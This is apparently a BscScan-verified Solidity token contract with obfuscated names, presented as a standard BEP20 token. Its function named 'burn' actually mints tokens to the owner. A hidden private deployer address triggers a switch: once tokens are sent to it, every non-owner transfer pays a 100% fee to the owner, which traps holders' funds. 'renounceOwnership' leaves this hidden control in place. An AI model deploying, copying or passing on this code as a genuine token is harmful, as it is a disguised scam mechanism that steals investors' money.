/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract sgdYpT {
string public  symbol = "CNFhZL";
uint256 public  FABMRt = 100000000000000000000000;
address public owner;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  uJkTKq = 1000000000000000000;
address public  BJFfmU = address(0);
uint256 public  TsRlMl = 10000000000000000000;
uint8 public constant decimals = 18;
uint256 public  Fzrmji = 10000000000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  nigDSd = address(0);
address public  UXYplU = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  idLfSI = address(0);
address public  VOAhJC = address(0);
address private  QTbGBc = address(0);
uint256 public  OIUWYJ = 100000000000000000000;
address public  RMkrll = address(0);
uint256 public constant jMdqve = 9+1;
uint256 public  uNPVtK = 10000000000000000;
uint256 public  ezzrue = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  LFqhWS = 10000000000000;
string public  name = "RjKqFW";
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  tkQfec = 100000000000000000;
mapping (address => uint256) public balanceOf;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor ()  {
QTbGBc = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TDcwGO");
require(to != address(0), "TDcwGO");
require(amount <= balanceOf[from], "TDcwGO");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* jMdqve/LFqhWS ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QTbGBc){
LFqhWS = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}

}